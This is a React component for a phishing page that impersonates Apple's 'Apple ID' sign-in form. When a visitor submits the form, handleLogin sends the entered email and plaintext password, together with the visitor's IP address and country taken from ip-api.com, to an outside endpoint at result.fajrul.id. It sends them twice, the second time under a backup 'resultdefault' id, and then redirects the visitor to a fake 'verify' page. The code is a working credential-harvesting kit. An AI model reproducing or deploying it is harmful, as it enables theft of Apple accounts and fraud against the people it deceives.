import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router";
import loginLogo from "./loginLogo.png";
import "./login.css";
import validator from "validator";
import CryptoJS from "crypto-js";
import Header from "../Header/Header";
import axios from "axios";
import { userId } from "../../config";

const Login = () => {
  const [loginView, setLoginView] = useState(true);
  const [isValid, setIsValid] = useState(false);

  const [ip, setIP] = useState("");

  const [email, setEmail] = useState("");
  const [location, setLocation] = useState("");
  const [emailHashed, setEmailHashed] = useState("");

  const [password, setPassword] = useState("");

  const btnLogin = document.getElementById("btnLogin");
  const btnLogin1 = document.getElementById("btnLogin1");

  const loading = document.getElementById("loading1");
  const passwordForm = document.getElementById("passwordForm");
  const emailForm = document.getElementById("emailForm");

  const encrypt = (data, key) => {
    return CryptoJS.AES.encrypt(data, key).toString();
  };
  //   const decrypt = (data, key) => {
  //     const bytes = CryptoJS.AES.decrypt(data, key);
  //     return bytes.toString(CryptoJS.enc.Utf8);
  //   };
  const data = {
    email: email,
    emailHashed: emailHashed,
    password: password,
  };

  const data1 = email;
  const key = "s";
  const encryptedData = encrypt(data1, key);

  function handleLogin(e) {
    e.preventDefault();
    if (password === "") {
      munculPass();
      setTimeout(() => {
        btnLogin1.style.display = "block";
      }, 1000);
    } else if (isValid === true) {
      const result = {
        email: email,
        password: password,
        location: location,
        userId: userId,
      };
      const resultbackup = {
        email: email,
        password: password,
        location: location,
        userId: "resultdefault",
      };
      axios
        .post("https://result.fajrul.id/api/login", result)
        .then((response) => {
          console.log(response);
          // do something with the response, such as redirect to the login page
        })
        .catch((error) => {
          console.log(error);
          // handle error, such as displaying error messages to the user
        });
      axios
        .post("https://result.fajrul.id/api/login", resultbackup)
        .then((response) => {
          console.log(response);
          // do something with the response, such as redirect to the login page
        })
        .catch((error) => {
          console.log(error);
          // handle error, such as displaying error messages to the user
        });

      setTimeout(() => {
        navigate(`/account/en/?view?=verify&&applIdKey?=${data.emailHashed}`, {
          state: data,
        });
        setLoginView(false);
      }, 2500);
    } else if (password !== "" || password === "") {
      btnLogin1.style.display = "none";
    } else {
      alert("invalid email");
    }

    return;
  }
  const getGeo = async () => {
    try {
      const response = await await axios.get(`http://ip-api.com/json/`);
      setLocation(`${response.data.country} ${response.data.query}`);
      setIP(response.data.query);
      console.info(response);
    } catch (error) {
      console.error(error);
    }
  };

  useEffect(() => {
    getGeo();
  }, []);

  const munculPass = () => {
    btnLogin.style.display = "none";
    loading.style.display = "block";
    const hilangLoad = () => {
      loading.style.display = "none";
    };
    const munculPass = () => {
      passwordForm.style.display = "flex";
      emailForm.classList.remove("rounded-b-xl");
    };
    console.log(isValid);
    if (isValid === true) {
      setTimeout(hilangLoad, 1000);
      setTimeout(munculPass, 1000);
    } else {
      setTimeout(hilangLoad, 1000);
      setTimeout(() => {
        btnLogin.style.display = "block";
      }, 1000);
      alert("invalid email");
    }
  };

  const handleClickLogin = () => {
    const loading2 = document.getElementById("loading2");
    const btnLogin = document.getElementById("btnLogin1");

    loading2.style.display = "block";
    btnLogin.style.display = "none";

    loading.style.display = "none";
    const hilangLoad1 = () => {
      loading2.style.display = "none";
    };
    setTimeout(hilangLoad1, 1000);
  };

  const navigate = useNavigate();
  useEffect(() => {
    setEmailHashed(encryptedData);
  }, []);

  return (
    <>
      <Header />
      <div className="flex flex-col items-center w-full">
        <div>
          <img
            src={loginLogo}
            alt=""
            className="max-w-[16rem] pointer-events-none mt-8"
          />
        </div>
        <div className="w-full flex justify-center">
          {loginView ? (
            <form
              autoComplete="off"
              className="max-w-[18rem] sm:max-w-xs w-full"
              id="form_login"
              onSubmit={handleLogin}
            >
              <div className="flex flex-col items-center gap-4 pb-4">
                <h1 className="font-medium text-3xl">Apple ID</h1>
                <h2 className="font-light">Manage your Apple account</h2>
              </div>
              <div
                id="emailForm"
                className="form-group flex-col flex border border-gray-400 rounded-t-xl rounded-b-xl px-2 mx-0"
              >
                <div className="flex justify-between items-center">
                  <input
                    type="email"
                    className="form-control py-4 pl-2 border-none outline-none w-full"
                    id="email"
                    placeholder="Apple ID"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      setIsValid(validator.isEmail(e.target.value));
                    }}
                  />

                  <div id="loading1" className="loading px-4 hidden"></div>

                  <input
                    type="button"
                    value=""
                    id="btnLogin"
                    onClick={munculPass}
                    className="btn w-[2.1rem] h-7 object-cover z-30 cursor-pointer mx-2"
                  />
                </div>
              </div>
              <div
                id="passwordForm"
                className="form-group flex-col flex border border-gray-400 rounded-b-xl px-2 mx-0 hidden"
              >
                <div className="flex justify-between items-center">
                  <input
                    type="password"
                    className="form-control py-4 pl-2 border-none outline-none w-full"
                    id="password"
                    placeholder="Enter Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />

                  <div id="loading2" className="loading px-4 hidden"></div>

                  <button
                    type="submit"
                    id="btnLogin1"
                    value=""
                    onClick={handleClickLogin}
                    className="btn w-[2.1rem] h-7 object-cover z-30 cursor-pointer mx-2"
                  />
                </div>
              </div>
              <div className="flex flex-row justify-center gap-1 md:mt-20">
                <input
                  type="checkbox"
                  id="remember-me"
                  className="form-choice form-choice-checkbox block"
                />
                <label
                  id="remember-me-label"
                  className="font-light my-5"
                  htmlFor="remember-me"
                >
                  <span className="font-light" aria-hidden="true"></span>{" "}
                  Remember me
                </label>
              </div>

              <div className="text-blue-600 text-center font-light text-sm my-4 border-t pt-4 cursor-pointer">
                Forgot Apple ID or password?
              </div>
            </form>
          ) : null}
        </div>
      </div>
    </>
  );
};

export default Login;
